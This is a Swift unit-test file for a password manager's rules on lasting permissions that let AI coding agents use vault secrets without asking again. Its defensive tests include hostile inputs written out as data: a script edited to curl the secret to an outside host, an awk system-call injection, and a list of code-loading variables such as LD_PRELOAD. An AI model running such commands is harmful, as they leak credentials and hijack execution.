import Foundation
import XCTest
@testable import PasswordPieAgent

/// The database's custom data as the app keeps it: grants go in and out as JSON text. Writes land at once, or wait for
/// `land()` as the app's background writer does.
@MainActor
final class FakeGrantDatabase {
    var customData: [String: String] = [:]
    var locked = false
    var deferWrites = false
    var writes = 0
    private var queued: [(edit: (inout AgentGrants) -> Void, done: (Bool) -> Void)] = []

    func read() -> AgentGrants? {
        locked ? nil : AgentGrants(customData: customData)
    }

    func write(_ edit: @escaping (inout AgentGrants) -> Void, _ done: @escaping (Bool) -> Void) {
        queued.append((edit, done))
        if !deferWrites { land() }
    }

    func land() {
        let all = queued
        queued = []
        for write in all {
            var grants = AgentGrants(customData: customData)
            write.edit(&grants)
            grants.write(into: &customData)
            writes += 1
            write.done(true)
        }
    }
}

@MainActor
final class StandingPermissionsTests: XCTestCase {
    private var vault: FakeVault!
    private var approver: FakeApprover!
    private var activity: MemoryActivity!
    private var database: FakeGrantDatabase!
    private var store: StandingPermissions!
    private var premium = true
    private var now = Date(timeIntervalSince1970: 2_000_000_000)
    private var project: URL!
    private let planted = "planted-grant-secret-5a7"

    override func setUp() async throws {
        vault = FakeVault()
        approver = FakeApprover()
        activity = MemoryActivity()
        database = FakeGrantDatabase()
        premium = true
        now = Date(timeIntervalSince1970: 2_000_000_000)
        vault.add("Token", password: planted, fields: ["Key ID": "KEYID-777777"])
        vault.add("Other", password: "other-secret-123")
        project = FileManager.default.temporaryDirectory.appendingPathComponent("grants-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: project.appendingPathComponent("Scripts"), withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: project.appendingPathComponent(".git"), withIntermediateDirectories: true)
        try script("Scripts/a.sh", "echo a")
        try script("Scripts/b.sh", "echo b")
        store = makeStore(mac: "this-mac")
    }

    override func tearDown() async throws {
        try? FileManager.default.removeItem(at: project)
    }

    private func makeStore(mac: String) -> StandingPermissions {
        let store = StandingPermissions(
            mac: mac, hasPremium: { [unowned self] in self.premium }, read: { [unowned self] in self.database.read() },
            write: { [unowned self] edit, done in self.database.write(edit, done) }
        )
        store.clock = { [unowned self] in self.now }
        store.sessionAlive = { _ in true }
        return store
    }

    private func script(_ path: String, _ body: String) throws {
        let url = project.appendingPathComponent(path)
        try "#!/bin/sh\n\(body)\n".write(to: url, atomically: true, encoding: .utf8)
        chmod(url.path, 0o755)
    }

    private func broker() -> VaultBroker {
        let broker = VaultBroker(vault: vault, approver: approver, grants: store, activity: activity) { true }
        broker.clock = { [unowned self] in self.now }
        return broker
    }

    private var caller: AgentCaller { Callers.make(project: project.path) }

    private func run(_ argv: [String], program: String? = nil, secrets: [AgentSecretRequest]? = nil, masking: Bool = true) -> AgentRequest {
        var request = AgentRequest.use(secrets ?? [AgentSecretRequest(name: "T", ref: "pp://Agents/Token", delivery: .env)], argv: argv, masking: masking)
        request.program = program ?? (argv[0].contains("/") ? project.appendingPathComponent(argv[0]).path : "/usr/bin/\(argv[0])")
        return request
    }

    /// Approves `request` in the window with a lasting choice, then returns the answer.
    private func grant(_ request: AgentRequest, from caller: AgentCaller? = nil, length: AgentGrantLength = .days7) async -> AgentResponse {
        approver.script = [.allowLasting([0], length)]
        return await broker().handle(request, from: caller ?? self.caller)
    }

    /// The owner's acceptance: with Premium, "7 days, this project" lets the next identical request through silently,
    /// and Activity says so.
    func testSevenDaysThisProjectLetsTheNextIdenticalRequestThroughSilently() async {
        let first = await grant(run(["Scripts/a.sh"]))
        XCTAssertEqual(first.secrets?.first?.value, planted)
        XCTAssertEqual(approver.prompts.last?.lasting, .offered)
        XCTAssertEqual(activity.records.last?.outcomeText, "allowed, and for 7 days, this project")
        XCTAssertEqual(database.writes, 1)
        let second = await broker().handle(run(["Scripts/a.sh"]), from: caller)
        XCTAssertEqual(second.secrets?.first?.value, planted)
        XCTAssertEqual(second.by, "7 days, this project")
        XCTAssertEqual(approver.prompts.count, 1, "no window the second time")
        XCTAssertEqual(activity.records.last?.outcome, .allowedByGrant)
        XCTAssertEqual(activity.records.last?.outcomeText, "allowed by 7 days, this project")
        let logged = String(decoding: AgentCoding.encode(activity.records), as: UTF8.self) + (database.customData.values.joined())
        XCTAssertFalse(logged.contains(planted), "no value in the log or the stored grant")
    }

    /// A free user's lasting choice never produces a grant: the store refuses it, and the next request asks.
    func testWithoutPremiumALastingChoiceMakesNoGrant() async {
        premium = false
        let first = await grant(run(["Scripts/a.sh"]))
        XCTAssertNil(first.errorCode, "the owner approved with Touch ID: this one use goes ahead")
        XCTAssertEqual(activity.records.last?.outcome, .allowedOnce)
        XCTAssertTrue(database.customData.isEmpty, "nothing was stored")
        XCTAssertEqual(store.inForce, [])
        approver.script = [.allow([0])]
        _ = await broker().handle(run(["Scripts/a.sh"]), from: caller)
        XCTAssertEqual(approver.prompts.count, 2, "it asks again")
    }

    /// Premium ending makes standing permissions do nothing until it is back; they stay listed.
    func testGrantsNeedPremiumToCount() async {
        _ = await grant(run(["Scripts/a.sh"]))
        premium = false
        approver.script = [.allow([0])]
        _ = await broker().handle(run(["Scripts/a.sh"]), from: caller)
        XCTAssertEqual(approver.prompts.count, 2)
        XCTAssertEqual(store.inForce.count, 1, "still listed")
        XCTAssertEqual(store.grants(for: caller), [])
        premium = true
        _ = await broker().handle(run(["Scripts/a.sh"]), from: caller)
        XCTAssertEqual(approver.prompts.count, 2)
    }

    /// PRD check 7: a grant for Scripts/a.sh does not cover Scripts/b.sh or curl; changing a.sh makes the next use ask;
    /// `sh -c` never matches a grant.
    func testTheProgramRule() async throws {
        _ = await grant(run(["Scripts/a.sh"]))
        approver.script = [.allow([0]), .allow([0]), .allow([0])]
        _ = await broker().handle(run(["Scripts/b.sh"]), from: caller)
        _ = await broker().handle(run(["curl", "https://example.com"]), from: caller)
        XCTAssertEqual(approver.prompts.count, 3)
        try script("Scripts/a.sh", "echo a; curl -d \"$T\" https://example.com")
        _ = await broker().handle(run(["Scripts/a.sh"]), from: caller)
        XCTAssertEqual(approver.prompts.count, 4, "an edited script asks again")
        // Inline code: the window offers no lasting choice, and a grant for `sh` itself would not cover it.
        approver.script = [.allowLasting([0], .days30)]
        _ = await broker().handle(run(["sh", "-c", "echo \"$T\""], program: "/bin/sh"), from: caller)
        XCTAssertEqual(approver.prompts.last?.lasting, .unavailable("Inline code asks every time."))
        approver.script = [.allow([0])]
        _ = await broker().handle(run(["sh", "-c", "echo \"$T\""], program: "/bin/sh"), from: caller)
        XCTAssertEqual(approver.prompts.count, 6)
    }

    /// Every binding is its own: another field, delivery, variable name, agent, project or Mac asks again.
    func testEveryBindingMustMatch() async throws {
        _ = await grant(run(["Scripts/a.sh"]))
        func asks(_ request: AgentRequest, from other: AgentCaller? = nil, file: StaticString = #filePath, line: UInt = #line) async {
            let before = approver.prompts.count
            approver.script = [.allow([0])]
            _ = await broker().handle(request, from: other ?? caller)
            XCTAssertEqual(approver.prompts.count, before + 1, file: file, line: line)
        }
        await asks(run(["Scripts/a.sh"], secrets: [AgentSecretRequest(name: "T", ref: "pp://Agents/Token/Key ID", delivery: .env)]))
        await asks(run(["Scripts/a.sh"], secrets: [AgentSecretRequest(name: "TOKEN", ref: "pp://Agents/Token", delivery: .env)]))
        await asks(run(["Scripts/a.sh"], secrets: [AgentSecretRequest(name: "T", ref: "pp://Agents/Token", delivery: .file)]))
        await asks(run(["Scripts/a.sh"], secrets: [AgentSecretRequest(name: nil, ref: "pp://Agents/Token", delivery: .stdin)]))
        await asks(run(["Scripts/a.sh"], secrets: [
            AgentSecretRequest(name: "T", ref: "pp://Agents/Token", delivery: .env), AgentSecretRequest(name: "O", ref: "pp://Agents/Other", delivery: .env),
        ]))
        await asks(run(["Scripts/a.sh"]), from: Callers.make(agent: "codex", project: project.path))
        let elsewhere = project.deletingLastPathComponent().appendingPathComponent("other-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: elsewhere.appendingPathComponent("Scripts"), withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: elsewhere) }
        try FileManager.default.copyItem(at: project.appendingPathComponent("Scripts/a.sh"), to: elsewhere.appendingPathComponent("Scripts/a.sh"))
        var other = Callers.make(project: elsewhere.path)
        other.cwd = elsewhere.path
        var moved = run(["Scripts/a.sh"])
        moved.program = elsewhere.appendingPathComponent("Scripts/a.sh").path
        await asks(moved, from: other)
        // The same file opened on another Mac.
        store = makeStore(mac: "another-mac")
        await asks(run(["Scripts/a.sh"]))
        // And a raw read, or a run with masking off: never covered.
        store = makeStore(mac: "this-mac")
        await asks(.read("pp://Agents/Token"))
        await asks(run(["Scripts/a.sh"], masking: false))
    }

    /// Only the rows the owner left ticked are granted.
    func testOnlyTickedSecretsAreGranted() async {
        let two = run(["Scripts/a.sh"], secrets: [
            AgentSecretRequest(name: "T", ref: "pp://Agents/Token", delivery: .env), AgentSecretRequest(name: "O", ref: "pp://Agents/Other", delivery: .env),
        ])
        approver.script = [.allowLasting([0], .hours8)]
        _ = await broker().handle(two, from: caller)
        XCTAssertEqual(store.inForce.first?.labels, ["Agents/Token › password"])
        let one = await broker().handle(run(["Scripts/a.sh"]), from: caller)
        XCTAssertEqual(one.by, "8 hours, this project")
    }

    func testLengthsEnd() async {
        _ = await grant(run(["Scripts/a.sh"]), length: .hours8)
        now = now.addingTimeInterval(8 * 3600 - 1)
        let inside = await broker().handle(run(["Scripts/a.sh"]), from: caller)
        XCTAssertEqual(inside.by, "8 hours, this project")
        now = now.addingTimeInterval(2)
        approver.script = [.allow([0])]
        _ = await broker().handle(run(["Scripts/a.sh"]), from: caller)
        XCTAssertEqual(approver.prompts.count, 2)
        let lengths: [TimeInterval] = [43_200, 28_800, 604_800, 2_592_000]
        XCTAssertEqual(AgentGrantLength.allCases.map(\.seconds), lengths)
    }

    /// "This agent session": that agent process only, ended when it quits, or when agent access is turned off.
    func testSessionGrants() async {
        _ = await grant(run(["Scripts/a.sh"]), length: .session)
        XCTAssertEqual(store.inForce.first?.session, "agent:100:1")
        XCTAssertEqual(store.inForce.first?.ends, now.addingTimeInterval(12 * 3600))
        approver.script = [.allow([0])]
        _ = await broker().handle(run(["Scripts/a.sh"]), from: Callers.make(session: "agent:101:5", project: project.path))
        XCTAssertEqual(approver.prompts.count, 2, "a later run of the same agent program asks")
        store.sessionAlive = { _ in false }
        approver.script = [.allow([0])]
        _ = await broker().handle(run(["Scripts/a.sh"]), from: caller)
        XCTAssertEqual(approver.prompts.count, 3, "the agent quit")
        store.sessionAlive = { _ in true }
        now = now.addingTimeInterval(1)
        store.endSessions()
        approver.script = [.allow([0])]
        _ = await broker().handle(run(["Scripts/a.sh"]), from: caller)
        XCTAssertEqual(approver.prompts.count, 4, "turning agent access off ended it")
        XCTAssertTrue(database.read()?.isEmpty ?? false)
    }

    /// A revoke counts from the next request, before the file is written.
    func testRevokingCountsAtOnce() async {
        _ = await grant(run(["Scripts/a.sh"]))
        _ = await grant(run(["Scripts/b.sh"]))
        database.deferWrites = true
        let a = store.inForce.first { $0.program?.display == "Scripts/a.sh" }!
        store.revoke(a.id)
        approver.script = [.allow([0])]
        _ = await broker().handle(run(["Scripts/a.sh"]), from: caller)
        XCTAssertEqual(approver.prompts.count, 3)
        let b = await broker().handle(run(["Scripts/b.sh"]), from: caller)
        XCTAssertEqual(b.by, "7 days, this project", "the other one still counts")
        store.revokeAll()
        approver.script = [.allow([0])]
        _ = await broker().handle(run(["Scripts/b.sh"]), from: caller)
        XCTAssertEqual(approver.prompts.count, 4)
        database.land()
        XCTAssertNil(database.customData[AgentGrants.customDataKey], "the file holds none")
    }

    /// A grant made while the file is still being written counts at once.
    func testANewGrantCountsBeforeTheFileIsWritten() async {
        database.deferWrites = true
        _ = await grant(run(["Scripts/a.sh"]))
        let second = await broker().handle(run(["Scripts/a.sh"]), from: caller)
        XCTAssertEqual(second.by, "7 days, this project")
        database.land()
        XCTAssertEqual(store.inForce.count, 1)
    }

    func testLockedUsesNothing() async {
        _ = await grant(run(["Scripts/a.sh"]))
        database.locked = true
        XCTAssertNil(store.grant(covering: AgentGrantQuery(caller: caller, kind: .use, raw: false, program: project.appendingPathComponent("Scripts/a.sh").path, argv: ["Scripts/a.sh"], secrets: [])))
        XCTAssertEqual(store.inForce, [])
    }

    func testStatusAndListSayWhatIsCovered() async {
        _ = await grant(run(["Scripts/a.sh"]))
        XCTAssertEqual(store.grants(for: caller), ["7 days, this project: Scripts/a.sh (Agents/Token › password)"])
        XCTAssertEqual(store.grants(for: Callers.make(agent: "codex", project: project.path)), [])
        let token = vault.items.first { $0.title == "Token" }!
        let other = vault.items.first { $0.title == "Other" }!
        XCTAssertTrue(store.covers(token, for: caller))
        XCTAssertFalse(store.covers(other, for: caller))
    }

    /// Grants are JSON in the database's custom data, and an entry that is not readable counts as none.
    func testStorageRoundTripsAndUnreadableIsNothing() async {
        _ = await grant(run(["Scripts/a.sh"]))
        let stored = AgentGrants(customData: database.customData)
        XCTAssertEqual(stored.all.count, 1)
        XCTAssertEqual(stored.all.first?.mac, "this-mac")
        XCTAssertEqual(stored.all.first?.program?.display, "Scripts/a.sh")
        XCTAssertEqual(AgentGrants(customData: [AgentGrants.customDataKey: "{not json"]).all, [])
        var empty: [String: String] = [AgentGrants.customDataKey: "x"]
        AgentGrants().write(into: &empty)
        XCTAssertTrue(empty.isEmpty)
    }

    func testTheMacIdentifierIsAHash() {
        let one = AgentMacIdentity.identifier(hardwareUUID: "11111111-2222-3333-4444-555555555555")
        XCTAssertEqual(one.count, 32)
        XCTAssertFalse(one.contains("1111"))
        XCTAssertNotEqual(one, AgentMacIdentity.identifier(hardwareUUID: "11111111-2222-3333-4444-555555555556"))
        XCTAssertEqual(AgentMacIdentity.current.count, 32)
    }
}

/// The program rule on its own (docs/AGENTS.md, "Standing permissions").
final class AgentProgramRuleTests: XCTestCase {
    private var project: URL!

    override func setUpWithError() throws {
        project = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("rule-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: project.appendingPathComponent("Scripts"), withIntermediateDirectories: true)
        for name in ["Scripts/a.sh", "Scripts/b.sh", "tool.py", "Makefile", "package.json", "upload.js"] {
            try "content of \(name)\n".write(to: project.appendingPathComponent(name), atomically: true, encoding: .utf8)
        }
        chmod(project.appendingPathComponent("Scripts/a.sh").path, 0o755)
        // Stand-ins for tools a test Mac may not have, outside the project.
        bin = project.deletingLastPathComponent().appendingPathComponent("bin-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: bin, withIntermediateDirectories: true)
        for name in ["node", "npm", "npx", "uv"] {
            FileManager.default.createFile(atPath: bin.appendingPathComponent(name).path, contents: Data("#!/bin/sh\n".utf8), attributes: [.posixPermissions: 0o755])
        }
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: project)
        try? FileManager.default.removeItem(at: bin)
    }

    private var bin: URL!

    private func tool(_ name: String) -> String { bin.appendingPathComponent(name).path }

    private func bind(_ argv: [String], program: String? = nil, environment: [String] = []) -> AgentProgramVerdict {
        let resolved = program ?? (argv[0].contains("/") ? project.appendingPathComponent(argv[0]).path : "/usr/bin/\(argv[0])")
        return AgentProgramRule.bind(program: resolved, argv: argv, cwd: project.path, project: project.path, environment: environment)
    }

    private func binding(_ argv: [String], program: String? = nil, file: StaticString = #filePath, line: UInt = #line) -> AgentProgramBinding? {
        guard case .bound(let binding) = bind(argv, program: program) else {
            XCTFail("\(argv) asks every time", file: file, line: line)
            return nil
        }
        return binding
    }

    private func asks(_ argv: [String], program: String? = nil, environment: [String] = [], file: StaticString = #filePath, line: UInt = #line) {
        if case .bound(let binding) = bind(argv, program: program, environment: environment) {
            XCTFail("\(argv) was bound to \(binding.display)", file: file, line: line)
        }
    }

    func testAProjectScriptIsBoundByContent() throws {
        let a = try XCTUnwrap(binding(["Scripts/a.sh", "--flag"]))
        XCTAssertEqual(a.display, "Scripts/a.sh")
        XCTAssertEqual(a.contents.count, 1)
        XCTAssertEqual(a.key, binding(["Scripts/a.sh", "other", "arguments"])?.key, "arguments are not part of the program")
        try "changed\n".write(to: project.appendingPathComponent("Scripts/a.sh"), atomically: true, encoding: .utf8)
        XCTAssertNotEqual(a.key, binding(["Scripts/a.sh"])?.key)
    }

    func testAProgramOutsideTheProjectIsBoundByPath() throws {
        let curl = try XCTUnwrap(binding(["curl", "-d", "@-"]))
        XCTAssertEqual(curl.program, "/usr/bin/curl")
        XCTAssertTrue(curl.contents.isEmpty)
        XCTAssertNotEqual(curl.key, binding(["git"])?.key)
    }

    func testShellsAreBoundToTheirScript() throws {
        let a = try XCTUnwrap(binding(["sh", "Scripts/a.sh"], program: "/bin/sh"))
        XCTAssertEqual(a.display, "sh Scripts/a.sh")
        XCTAssertNotEqual(a.key, binding(["sh", "Scripts/b.sh"], program: "/bin/sh")?.key)
        XCTAssertNotEqual(a.key, binding(["bash", "Scripts/a.sh"], program: "/bin/bash")?.key)
        XCTAssertEqual(a.key, binding(["sh", "-e", "Scripts/a.sh"], program: "/bin/sh")?.key)
        XCTAssertEqual(binding(["bash", "-o", "pipefail", "Scripts/a.sh"], program: "/bin/bash")?.display, "bash Scripts/a.sh")
    }

    func testInlineCodeNeverBinds() {
        asks(["sh", "-c", "echo"], program: "/bin/sh")
        asks(["sh", "-c", "Scripts/a.sh"], program: "/bin/sh")
        asks(["bash", "-ec", "echo"], program: "/bin/bash")
        asks(["zsh", "-lc", "echo"], program: "/bin/zsh")
        asks(["sh"], program: "/bin/sh")
        asks(["sh", "-s"], program: "/bin/sh")
        asks(["sh", "-"], program: "/bin/sh")
        asks(["python3", "-c", "print(1)"])
        asks(["python3"])
        asks(["perl", "-e", "print 1"])
        asks(["ruby", "-e", "puts 1"])
        asks(["osascript", "-e", "beep"])
        asks(["node", "-e", "1"], program: tool("node"))
        asks(["node", "--eval", "1"], program: tool("node"))
        asks(["npx", "-c", "echo"], program: tool("npx"))
        asks(["env", "sh", "-c", "echo"])
    }

    func testUnknownLaunchersAndUnreadOptionsAsk() {
        asks(["xargs", "sh"])
        asks(["sudo", "Scripts/a.sh"], program: "/usr/bin/sudo")
        asks(["swift", "run"], program: "/usr/bin/swift")
        asks(["awk", "BEGIN{system(\"id\")}"], program: "/usr/bin/awk")
        asks(["node", "-r", "./x.js", "upload.js"], program: tool("node"))
        asks(["bash", "--rcfile", "x", "Scripts/a.sh"], program: "/bin/bash")
        asks(["make", "CC=evil"], program: "/usr/bin/make")
        asks(["env", "PATH=/tmp", "curl"])
        asks(["env", "BASH_ENV=/tmp/x", "Scripts/a.sh"])
        asks(["sh", "Scripts/missing.sh"], program: "/bin/sh")
    }

    /// A link named `deploy` to /bin/sh is read as sh.
    func testALinkToAShellIsReadAsTheShell() throws {
        let link = project.appendingPathComponent("deploy")
        try FileManager.default.createSymbolicLink(atPath: link.path, withDestinationPath: "/bin/sh")
        asks(["./deploy", "-c", "echo"], program: link.path)
    }

    func testCodeLoadingVariablesAsk() {
        for variable in ["BASH_ENV", "NODE_OPTIONS", "PYTHONPATH", "DYLD_INSERT_LIBRARIES", "LD_PRELOAD", "PERL5OPT", "RUBYOPT"] {
            asks(["Scripts/a.sh"], environment: ["HOME", variable])
        }
        XCTAssertNotNil(binding(["Scripts/a.sh"]))
        if case .asksEveryTime(let why) = bind(["Scripts/a.sh"], environment: ["BASH_ENV"]) {
            XCTAssertEqual(why, "Started with BASH_ENV set, which makes programs load other code.")
        }
    }

    /// The tool's resolved program must be the typed command's.
    func testAProgramThatDoesNotMatchTheCommandAsks() {
        asks(["curl"], program: "/bin/sh")
        asks(["Scripts/a.sh"], program: project.appendingPathComponent("Scripts/b.sh").path)
        XCTAssertEqual(AgentProgramRule.bind(program: nil, argv: ["curl"], cwd: project.path, project: project.path), .asksEveryTime("There is no command to bind it to."))
    }

    func testInterpretersAndTools() throws {
        let python = try XCTUnwrap(binding(["python3", "tool.py", "--upload"]))
        XCTAssertEqual(python.display, "python3 tool.py")
        XCTAssertEqual(python.contents.count, 1)
        XCTAssertEqual(binding(["python3", "-u", "tool.py"])?.key, python.key)
        XCTAssertEqual(binding(["python3", "-m", "twine", "upload"])?.display, "python3 -m twine")
        XCTAssertEqual(binding(["python3", "-m", "tool"])?.contents.count, 1, "a local module is bound by its content")
        XCTAssertEqual(binding(["node", "upload.js"], program: tool("node"))?.display, "node upload.js")
        let notarytool = try XCTUnwrap(binding(["xcrun", "notarytool", "submit", "x.dmg"]))
        XCTAssertEqual(notarytool.display, "xcrun notarytool")
        XCTAssertNotEqual(notarytool.key, binding(["xcrun", "altool"])?.key)
        XCTAssertEqual(binding(["xcrun", "--sdk", "macosx", "notarytool"])?.key, notarytool.key)
        let deploy = try XCTUnwrap(binding(["npm", "run", "deploy"], program: tool("npm")))
        XCTAssertEqual(deploy.display, "npm run deploy")
        XCTAssertEqual(deploy.contents.count, 1, "bound to package.json")
        XCTAssertNotEqual(deploy.key, binding(["npm", "run", "test"], program: tool("npm"))?.key)
        asks(["npm", "exec", "x"], program: tool("npm"))
        let make = try XCTUnwrap(binding(["make", "release"]))
        XCTAssertEqual(make.display, "make release")
        XCTAssertNotEqual(make.key, binding(["make", "clean"])?.key)
        try "changed\n".write(to: project.appendingPathComponent("Makefile"), atomically: true, encoding: .utf8)
        XCTAssertNotEqual(make.key, binding(["make", "release"])?.key)
        XCTAssertEqual(binding(["npx", "-y", "wrangler", "deploy"], program: tool("npx"))?.display, "npx wrangler")
        XCTAssertEqual(binding(["env", "FOO=1", "python3", "tool.py"])?.display, "env python3 tool.py")
        XCTAssertEqual(binding(["uv", "run", "tool.py"], program: tool("uv"))?.display, "uv run tool.py")
    }

    func testFamilies() {
        XCTAssertEqual(AgentProgramRule.family("python3.12"), "python")
        XCTAssertEqual(AgentProgramRule.family("Python3"), "python")
        XCTAssertEqual(AgentProgramRule.family("-zsh"), "zsh")
        XCTAssertEqual(AgentProgramRule.family("pythonista"), "pythonista")
        XCTAssertEqual(AgentProgramRule.family("node22"), "node")
    }
}
